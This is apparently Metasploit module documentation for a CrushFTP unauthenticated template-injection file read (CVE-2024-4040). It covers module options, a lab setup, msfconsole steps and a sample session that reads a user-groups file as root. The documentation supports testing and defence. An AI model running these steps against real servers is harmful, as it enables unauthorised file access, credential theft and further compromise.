## Vulnerable Application
This module leverages an unauthenticated server-side template injection vulnerability in CrushFTP < 10.7.1 and
< 11.1.0 (as well as legacy 9.x versions). Attackers can submit template injection payloads to the web API without
authentication. When attacker payloads are reflected in the server's responses, the payloads are evaluated. The
primary impact of the injection is arbitrary file read as root, which can result in authentication bypass, remote
code execution, and NetNTLMv2 theft (when the host OS is Windows and SMB egress traffic is permitted).
More information can be found in the [Rapid7 AttackerKB Analysis](https://attackerkb.com/topics/20oYjlmfXa/cve-2024-4040/rapid7-analysis).

## Options

### INJECTINTO
The unauthenticated API function to use for template injection (default: zip).

### STORE_LOOT
Whether the read file's contents should be outputted to the console or stored as loot (default: false).

### TARGETFILE
The target file to read (default: users/MainUsers/groups.XML). This can be a full path, a relative path, or a network share path (if 
firewalls permit). Files containing binary data may not be read accurately. Though file paths for Windows targets can contain `:` 
characters, like `C:\Windows\win.ini`, this will result in payloads not being fully redacted from CrushFTP logs.

## Testing
To set up a test environment:
1. Download an affected version of CrushFTP [here](https://github.com/the-emmons/CVE-2023-43177/releases/download/crushftp_software/CrushFTP10.zip) (SHA256: adc3619937ebb57b3a95c50f78fda5c388d072c0d34a317b9ed64a31127a6d3f).
2. Configure `CRUSH_DIR` in `crushftp_init.sh` to point to the correct install directory.
3. Execute `java -jar CrushFTP.jar` to show a local client GUI interface that can be used to set up an admin account.
4. Execute `sudo crushftp_init.sh start` to launch the software on Linux or Mac. If on Windows, run `CrushFTP.exe` as an administrator.
5. Follow the verification steps below.

## Verification Steps
1. Start msfconsole
2. `use auxiliary/gather/crushftp_fileread_cve_2024_4040`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_PORT>`
5. `set TARGETFILE <TARGET_FILE_TO_READ>`
6. `set STORE_LOOT false` if you want to display file on the console instead of storing it as loot.
7. `run`

## Scenarios
### CrushFTP on Windows, Linux, or Mac
```
msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > show options 

Module options (auxiliary/gather/crushftp_fileread_cve_2024_4040):

   Name        Current Setting             Required  Description
   ----        ---------------             --------  -----------
   INJECTINTO  zip                         yes       The CrushFTP API function to inject into (Accepted: zip, exists)
   Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasp
                                                     loit.html
   RPORT       8080                        yes       The target port (TCP)
   SSL         false                       no        Negotiate SSL/TLS for outgoing connections
   STORE_LOOT  false                       yes       Store the target file as loot
   TARGETFILE  users/MainUsers/groups.XML  yes       The target file to read. This can be a full path, a relative path, or a network share path (i
                                                     f firewalls permit). Files containing binary data may not be read accurately
   TARGETURI   /                           yes       The URI path to CrushFTP
   VHOST                                   no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > check
[+] 127.0.0.1:8080 - The target is vulnerable. Server-side template injection successful!
msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > run
[*] Running module against 127.0.0.1

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Server-side template injection successful!
[*] Fetching anonymous session cookie...
[*] Using template injection to read file: users/MainUsers/groups.XML
[+] File read succeeded! 
<?xml version="1.0" encoding="UTF-8"?>
<groups type="properties"></groups>



[*] Auxiliary module execution completed
```
